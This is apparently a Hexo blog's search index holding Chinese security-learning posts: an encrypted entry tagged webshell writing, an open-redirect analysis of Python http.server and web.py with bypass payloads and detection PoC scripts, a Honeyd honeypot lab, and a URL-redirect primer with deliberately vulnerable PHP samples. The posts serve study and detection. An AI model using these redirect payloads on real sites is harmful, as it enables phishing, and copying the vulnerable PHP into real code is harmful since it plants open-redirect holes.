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]]></content>
      <categories>
        <category>PHP基础</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>webshell写入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[URL跳转漏洞白盒实践]]></title>
    <url>%2F2018%2F11%2F21%2FURL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%E7%99%BD%E7%9B%92%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[python: http.server / web.py URL跳转漏洞实践 前几天学习了URL跳转漏洞，主要是从黑盒进行测试，今天看了P牛的一篇关于python的http.server和web.py的URL跳转漏洞分析，是从白盒来进行分析测试的，现将实践记录如下。 HTTP.SERVER python一键启动web服务器 python -m http.server 在任意目录执行上面的命令，可以启动一个web服务端，模拟一个服务器。这里用到了http.server这个模块 http.server模块下包含几个类 HTTPServer这个类继承于socketserver.TCPServer，说明其实HTTP服务器本质是一个TCP服务器 BaseHTTPRequestHandler，这是一个处理TCP协议内容的Handler，目的就是将从TCP流中获取的数据按照HTTP协议进行解析，并按照HTTP协议返回相应数据包。但这个类解析数据包后没有进行任何操作 SimpleHTTPRequestHandler，这个类继承于BaseHTTPRequestHandler，从父类中拿到解析好的数据包，并将用户请求的path返回给用户，等于实现了一个静态文件服务器。 CGIHTTPRequestHandler，这个类继承于SimpleHTTPRequestHandler，在静态文件服务器的基础上，增加了执行CGI脚本的功能。 http.server的几个类的关系就是下面这样（P牛的图） 通过分析：SimpleHTTPRequestHandler是将用户请求的path返回给用户的，并且它继承了BaseHTTPRequestHandler类的HTTP协议解析的特性，并返回数据包，所以说明http.server这个发生URL跳转会发生在SimpleHTTPRequestHandler的代码中 分析SimpleHTTPRequestHandler类源码 1234567891011121314151617181920212223242526272829303132333435363738394041class SimpleHTTPRequestHandler(BaseHTTPRequestHandler): server_version = "SimpleHTTP/" + __version__ #如果是GET请求就调用do_GET函数，在do_GET中调用了send_head函数 def do_GET(self): """Serve a GET request.""" f = self.send_head() if f: try: self.copyfile(f, self.wfile) finally: f.close() # ... def send_head(self): #translate_path函数解析用户输入的请求path，判断用户真正请求的文件 path = self.translate_path(self.path) f = None #判断用户的请求的文件或目录是否在web服务器的目录中，如果在则进入第一个if语 句，如果请求的路径不存在则跳转到web服务的主页 if os.path.isdir(path): #将用户输入的请求解析过后用rllib.parse.urlsplit拆分，用于后面的判断 parts = urllib.parse.urlsplit(self.path) #判断用户请求的地址是否以'/'结尾，如果是则直接返回相应请求内容，如果不是 则进入第二个if语句，将用户的请求加上'/'后进行跳转，也是漏洞点 if not parts.path.endswith('/'): # redirect browser - doing basically what apache does self.send_response(HTTPStatus.MOVED_PERMANENTLY) new_parts = (parts[0], parts[1], parts[2] + '/', parts[3], parts[4]) new_url = urllib.parse.urlunsplit(new_parts) self.send_header("Location", new_url) self.end_headers() return None for index in "index.html", "index.htm": index = os.path.join(path, index) if os.path.exists(index): path = index break else: return self.list_directory(path) # ... 找到漏洞点在 if not parts.path.endswith(‘/‘)后进一步分析： 这里的代码逻辑是判断用户请求的一个已经存在的文件是不是以 ‘/’结尾的，如果不是，则加上‘/’进行301跳转。 现在主流的浏览器访问 //baidu.com 时候会跳转到 baidu.com 会默认认为这个URL是当前数据包的协议，也就是说，这里要跳转，必须要构造成跳转时能解析为一个正常的域名，必须构造成 127.0.0.1:8000//baidu.com 常见的URL跳转应该是127.0.0.1:8000/baidu.com一个斜杠，这里为什么要两个呢；原因在parts = urllib.parse.urlsplit(self.path)这里的分割，可以看到使用双斜杠后将用户的请求解析成一个netlocation,这里就会发生跳转，产生URL跳转漏洞。 现在触发点找到了，还有一个问题，就是初始值的判断，http.server会判断用户访问的资源站内是否存在，绕过这个限制可以让请求跳到下一级目录 /.. 构造payload：127.0.0.1:8000//baidu.com//..(请求后没有跳转到百度，而是跳转到首页，抓包分析) 在浏览器直接请求127.0.0.1:8000//baidu.com//..根本不会将/..传到服务器，所以服务器收到的请求是 127.0.0.1:8000//baidu.com/ 然后判断站点中不存在用户请求的资源 要让服务端收到的请求中包跳目录的请求，必须进行URL编码：(成功跳转，已经证明漏洞存在，这里的绕过跨目录没法控制，不能调到baidu主页，但是学习思路，证明漏洞存在已经达到目标了) 127.0.0.1:8000//baidu.com/%2f.. 或 127.0.0.1:8000//baidu.com/%2f%2e%2e web.py框架继承并使用了SimpleHTTPRequestHandler类，web.py在处理静态文件的时候会使用SimpleHTTPRequestHandler`类，所以会受到影响 简单的web.py代码 123456789101112131415import weburls = ( '/(.*)', 'hello')app = web.application(urls, globals())class hello: def GET(self, name): if not name: name = 'World' return 'Hello, ' + name + '!'if __name__ == "__main__": app.run() 模拟真实的生产环境：（web.py的应用中必须是静态文件才有效，所以必须制定css,js,图片等，原原理都是一样的，这里的@代表后面的是域名） http://127.0.0.1:8080////static%2fcss%2f@www.example.com/..%2f 自动化检测 http.server——poc 1234567891011121314151617181920212223242526import requestsimport urllibimport sysdef poc(url): #urllib.parse.urlparse代替python2中的urlparse模块中的urlparse.urlparse()方法 x = urllib.parse.urlparse(url) target = "&#123;0&#125;://&#123;1&#125;".format(x.scheme,x.netloc) payload = "&#123;0&#125;//example.com/%2f%2e%2e".format(target) print(payload) response = requests.get(payload,allow_redirects=False,timeout=3,verify=False) if response.status_code == 301: try: location = response.headers["Location"] if "example.com" in location: print("sucess") else: print("false") except: return False passif __name__ == "__main__": print('Start!') poc(sys.argv[1]) print('End!') web.py——poc 1234567891011121314151617181920212223242526272829303132333435import requestsimport urllibimport sysdef poc(url): print("you should provide a static resoure url, like js or css or picture!") x = urllib.parse.urlparse(url) #将静态文件路径中的"/"转换为%2f path_list = x.path.split("/") path_list.pop() path_list.remove("") path_list.append("") path = "%2f".join(path_list) # print(path) target = "&#123;0&#125;://&#123;1&#125;".format(x.scheme,x.netloc) payload = "&#123;0&#125;////&#123;1&#125;@www.example.com/..%2f".format(target,path) print(payload) response = requests.get(payload,allow_redirects=False,timeout=3,verify=False) if response.status_code == 301: try: location = response.headers["Location"] if "example.com" in location: print("sucess") else: print("false") except: return False passif __name__ == "__main__": print('Start!') # poc(sys.argv[1]) poc('http://127.0.0.1:8080/static/css/') print('End!') 总结通过一次白盒的URL跳转漏洞实践可以更好的掌握其原理，对黑盒测试也有帮助；比如这里的绕过文件判断的限制“/..”，与黑盒中的一些畸形绕过的方式就类似，学海无涯。 参考链接https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html http://www.polaris-lab.com/index.php/tag/web-py/]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>URL跳转</tag>
        <tag>WEB安全</tag>
        <tag>python安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用Honeyd搭建简易蜜罐]]></title>
    <url>%2F2018%2F11%2F20%2F%E5%88%A9%E7%94%A8Honeyd%E6%90%AD%E5%BB%BA%E7%AE%80%E6%98%93%E8%9C%9C%E7%BD%90%2F</url>
    <content type="text"><![CDATA[一次实验课：利用honeyd搭建蜜罐Honeyd相关依赖的安装安装g++ gcc（对相关的一些依赖进行源码编译安装）sudo apt-get update &amp;&amp; sudo apt-get install g++ gcc 安装Libevent(非同步事件通知的函数库)通过使用libevent，开发人员可以设定某些事件发生时所执行的函数，可以代替以往程序所使用的循环检查 1234sudo tar -zxvf libevent-1.4.14b-stable.tar.gz sudo ./configure sudo makesudo make install 安装Libdnet(提供跨平台的网络相关的API函数库)包括了ARP缓存，路由表查询，IP包及物理帧的传输 1234sudo tar -zxvf libdnet-1.11.tar.gz sudo ./configuresudo makesudo make install 安装Libpcap(一个数据包捕获函数库，大多数网络软件都以它为基础)123456789sudo tar -zxvf libpcap-1.7.3.tar.gzsudo tar -zxvf libpcap-1.5.3.tar.gz sudo ./configuresudo makesudo make install#在Ubuntu下缺少 flex bison 手动安装sudo apt-get install flexsudo apt-get install bison 安装ARPD（运行在与Honeyd相同的系统上）是honeyd众多协作工具中最重要的一个工具。ARPD工作时监听局域网内的流量，并通过查看honeyd系统的ARP表判断其他系统是否存活。在蜜罐系统中ARPD会对指定IP地址范围内未使用的IP用honedy的MAC地址做出arp应答。这样对指定IP地址范围内未使用的IP的连接访问都被重定向到蜜罐主机。这样设计可以在内网中最大化的诱导蠕虫病毒，诱导攻击流。 123456sudo tar -zxvf arpd-0.2.tar.gz sudo ./configure #报错：error：expected’)’ before string constant#解决：在arpd.c文件中添加#define __FUNCTION__sudo makesudo make install 安装Honeyd1234sudo tar -zxvf honeyd-1.5c.tar.gzsudo ./configure#报错：configure: error: Couldn&apos;t figure out how to access libc#解决：sudo ln -s /lib/x86_64-linux-gnu/libc.so.6 /usr/lib/libc.so 检测arpd和honeyd是否可以运行arpd1234567#运行后显示链接不存在#解决：whereis libevent-1.4.so.2#将libevent-1.4.so.2位置添加到/etc/ld.so.confsudo vim /etc/ld.so.conf#重新加载链接sudo ldconfig honeyd123456789honeyd#报错：无法加载libdnet#解决：也是无法链接，但是这个缺少链接文件：whereis libdnet#生成链接sudo cp /usr/local/lib/libdnet.1.0.1 /usr/local/lib/libdnet.so.1.0.1#重新加载sudo /sbin/ldconfigsudo updatedb 简单的调试与测试 arpd侦听ens33网卡上的一个空闲的ip:192.168.1.71 sudo arpd -i ens33 192.168.1.71 将honeyd下的config.sample改名并配置蜜罐启动的系统及其配置 123456789101112131415161718192021222324sudo mv config.sample ./honeyd.confsudo vim honeyd.conf# Example of a simple host template and its bindingcreate windows#创建一个windows xp系统的蜜罐set windows personality &quot;Microsoft Windows XP Professional SP1&quot;#设置系统重启时间set windows uptime 1728650#设置最大文件描述符set windows maxfds 35#开启80端口web服务且侦听脚本为honeyd-1.5c/scripts/web.shadd windows tcp port 80 &quot;sh sh //home/toml/Desktop/honeyd/honeyd-1.5c/scripts/web.sh&quot;#开启22，23端口add windows tcp port 22 &quot;sh scripts/test.sh $ipsrc $dport&quot;add windows tcp port 23 proxy $ipsrc:23#add template udp port 53 proxy 141.211.92.141:53#关闭默认的tcp,udp连接set windows default tcp action resetset windows default udp action reset#开启135，139端口add windows tcp port 135 openadd windows tcp port 139 openbind 192.168.1.71 windows 启动honeyd 1sudo honeyd -d -f honeyd.conf -p nmap.prints -x xprobe2.conf -a nmap.assoc -i ens33 192.168.1.71 在同网段下ping，访问web服务 蜜罐的监听显示如下（分别是本机ping蜜罐机192.168.1.71的ping包和本机访问蜜罐主机的80端口建立连接的过程） 蜜罐主机应用的web服务显示的脚本内容 实验思考题如何利用Honeyd实现跨网段的模拟。 回答： 可以利用wmware自带的NAT模式实现路由转发的功能，达到跨网段访问的目的。 可以通过自己手动配置路由表，添加路由规则实现跨网段访问的目的。 实验中的问题 对于Libpcap的安装：在Debian下1.7.3版本太高，会出现头文件的报错，使用1.5.3版本，Ubuntu系统无影响；在Ubuntu下缺少 flex bison ，需要手动安装。 安装完所有的依赖及honeyd后需要配置arpd和honeyd链接的问题，不然无法运行。 参考链接https://blog.csdn.net/key_1997/article/details/81322352（Ubuntu系统） https://blog.csdn.net/accepthjp/article/details/46399715 https://blog.csdn.net/LFGxiaogang/article/details/73287152]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>蜜罐</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[URL跳转学习总结]]></title>
    <url>%2F2018%2F11%2F12%2FURL%E8%B7%B3%E8%BD%AC%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[URL跳转漏洞学习总结相关背景现在web应用越来越多的需要和其他第三方应用交互，以及在自身应用内部根据不同的逻辑引向不同的页面。例如一个典型的场景就是：web站点可以使用第三方账号（如qq,微博等）进行登录，在登录时就会发生跳转，如果在这个过程中没有做好安全策略就会产生安全漏洞。例如可以利用恶意的URL跳转进行钓鱼等。 URL重定向（301/302） 301重定向：当域名或者网址永久弃用后，为了方便可以将此域名或网址重定向到新的域名或URL 302重定向：当域名或网址临时弃用时，为了方便可以将此域名或网址重定向到新的域名或URL 302URL劫持与302任意URL跳转的不同点 302——URL劫持是由于搜素引擎的算法导致的问题。例如A网站暂时弃用，要302重定向到B网站，但是由于B网站URL太过复杂，而搜索引擎的算法判定A网址更加适合，所以爬取的还是A网址，这个时候访问网站是显示的URL是A网站的，而显示的内容是B网站的，造成了302重定向——URL劫持。 302——任意URL跳转是用户可以直接控制URL跳转的参数或者通过一些绕过方式控制URL跳转的位置造成的问题。 成因web站点或者第三方的服务端没有对用户输入的参数进行合法性校验，或者校验不严格，在URL跳转时用户可控，导致恶意参数的传入以及执行，将应用程序引导到恶意的第三方区域产生的安全问题（短链接更加难以防范）。 漏洞出现的详细原因 写代码时没有考虑过任意URL跳转漏洞，或者根本不知道/不认为这是个漏洞 写代码时考虑不周,用取子串、取后缀等方法简单判断，代码逻辑可被绕过 对传入参数做一些奇葩的操作(域名剪切/拼接/重组)和判断，适得其反，反被绕过 原始语言自带的解析URL、判断域名的函数库出现逻辑漏洞或者意外特性,可被绕过 原始语言、服务器/容器特性、浏览器等对标准URL协议解析处理等差异性导致被绕过 WEB站点中URL跳转漏洞的发生点 用户登录、统一身份认证处、认证以后发生跳转 用户分享、收藏内容后会发生跳转 跨站点认证、在授权后会认证 站内对其他网站的链接，点击后会跳转 URL跳转的实现方式 通过META标签内跳转 实例： 1234567891011121314151617&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;?phpheader("Content-Type:text/html;charset=utf-8");if(isset($_REQUEST["url"]))&#123; $url = $_REQUEST["url"];&#125;else&#123; $url = "url_meta.php";&#125; ?&gt;&lt;meta http-equiv="Refresh" content="5; url=&lt;?php echo $url?&gt;" /&gt; &lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 通过JavaScript跳转 实例： 123456789&lt;?phpif (isset($_GET['url'])) &#123; $target = $_GET['url']; echo "&lt;script&gt;window.location.href=\"$target\"&lt;/script&gt;"; exit;&#125; else &#123; echo "Please input the URL";&#125;?&gt; 通过header头跳转 实例： 123456789&lt;?phpif (isset($_GET['url'])) &#123; $target = $_GET['url']; header("Location: $target"); exit;&#125; else &#123; echo "Please input the URL";&#125;?&gt; 如果jump参数没有任何限制，用户就可以构造恶意链接进行提交造成恶意URL跳转 http://www.lsowl.xyz/aaa.php?url=http://www.eval.com ，通过恶意链接造成不可信的第三方跳转可以进一步钓鱼等(直接跳转)。 同时由于一些网站的安全策略，白名单中有 http://www.lsowl.xyz/aaa.php 而导致一些安全策略被绕过，导致用户最终访问的时恶意链接。（过滤不严格的白名单） 通过GET或POST的方式接收将要跳转的URL，然后通过上面的几种方式中的一种来跳转到目标URL。由于用户的输入会进入META，JavaScript，http头，所以都可能发生相应的上下文漏洞，如XSS等，同时URL跳转功能的特点，会在浏览器将用户从可信的站点跳转到不可信的站点，如果用户的输入带有敏感信息会泄露给不可信的第三方。 常见的发生URL跳转的参数名 redirect redirect_to redirect_url url jump jump_to target to link linkto domain 